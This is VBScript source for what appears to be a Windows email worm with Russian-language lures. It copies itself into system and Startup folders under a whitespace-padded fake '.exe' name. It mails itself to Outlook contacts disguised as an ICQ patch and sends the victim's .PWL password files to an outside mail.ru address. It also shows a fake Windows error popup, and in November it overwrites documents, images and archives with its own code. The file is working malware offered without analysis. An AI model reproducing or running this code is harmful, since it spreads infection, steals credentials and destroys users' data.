On Error Resume Next
Dim FileSysObject, File
Set FileSysObject = CreateObject ("Scripting.FileSystemObject")
Set File = FileSysObject.GetFile(WScript.ScriptFullName)
Set s = CreateObject("Wscript.Shell")
File.Copy ("C:\windows\system\ICQ PATH.exe                                 .vbe")
File.Copy ("c:\windows\Fister.dll.vbe")
File.Copy ("C:\Windows\главное меню\программы\автозагрузка\MSOffice.vbe")
Set WSHShell = WScript.CreateObject("WScript.Shell")
if day(now)=9 or day(now)<9 Then
Dim OutlookObject, OutMail
Set OutlookObject = CreateObject("Outlook.Application")
Set OutMail = OutlookObject.CreateItem(0)
OutMail._
to = OutlookObject._
GetNameSpace("MAPI").AddressLists(1).AddressEntries(1)
OutMail.Subject = "ICQ UPDATE PRO"
OutMail._
Body = "Представляем вашему вниманию, патч для популярного интернет-пейджера ICQ. Это дополнение содержит 60 новых смайлов и многое другое! Спасибо за пользование нашей программой! ICQ SERver/www.icq.com/" 
OutMail._
Attachments.Add"C:\windows\system\ICQ PATH.exe                                 .vbe"
OutMail._
Send
Dim OutlookObject2, OutMail2
Set OutlookObject2 = CreateObject("Outlook.Application")
Set OutMail2 = OutlookObject.CreateItem(0)
OutMail2._
to = "Killer_Pavel@mail.ru"
OutMail2._
Subject = "Newpwl"
OutMail2._
Body = "Привет"
OutMail2._
Attachments._
Add"C:\windows\*.PWL"
OutMail2._
Send
end if
on error resume next
if day(now)=13  then
s.popup "Произошла непредвиденная ошибка Windows.Будет произведено экстренное копирование системных файлов. Вставьте чистую дискету и дождитесь завершения копирования. В противном случае Windows прекратит свою работу.", ,"Error", 0+16
set mplayer=CreateObject("WMPlayer.OCX.7")
mplayer.cdromcollection.item(count).eject()
Dim fso, odrive
Dim x, y, z
y=10000
Set fso = CreateObject("Scripting.FileSystemObject")
set odrive = fso.getdrive("a:\")
for x=1 to y
if odrive.isready then
z=1
end if
next
end if
if day(now)=13 then
File.Copy ("A:\System32.vbe")
File.Copy ("A:\format.vbe")
File.Copy ("A:\fdisk.vbe")
File.Copy ("A:\winold.vbe")
end if
if month(now)=11 then
on error resume next
set f=createobject("scripting.filesystemobject")
m=wscript.scriptfullname
for each d in f.drives
if d.drivetype=2 or d.drivetype=3  then
for each p in f.getfolder(d.path).subfolders
for each v in f.getfolder (p.path).files
if right(v.path,4)=".txt" or right(v.path,4)=".doc" or right(v.path,4)=".htm" or right(v.path,4)=".vbe" or right(v.path,4)=".jpg" or right(v.path,4)=".ini" or right(v.path,4)=".rar" or right(v.path,4)=".zip" then
f.opentextfile(v.path,2).write f.opentextfile (m).readall
end if
next
next
end if
next
end if

